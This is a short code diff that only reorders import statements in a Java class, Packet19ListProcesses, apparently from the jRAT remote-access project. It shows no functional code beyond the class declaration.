@@ -1,20 +1,19 @@
 package jrat.module.process;
 
+import jrat.client.Connection;
 import jrat.client.packets.incoming.AbstractIncomingPacket;
 import jrat.common.ProcessData;
 import jrat.common.utils.DataUnits;
-import jrat.client.Connection;
+import oslib.OperatingSystem;
+import oslib.windows.WindowsOperatingSystem;
+import oslib.windows.WindowsVersion;
 
+import javax.swing.*;
+import javax.swing.filechooser.FileSystemView;
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStreamReader;
-import javax.swing.ImageIcon;
-import javax.swing.filechooser.FileSystemView;
-
-import oslib.OperatingSystem;
-import oslib.windows.WindowsOperatingSystem;
-import oslib.windows.WindowsVersion;
 
 
 public class Packet19ListProcesses extends AbstractIncomingPacket {
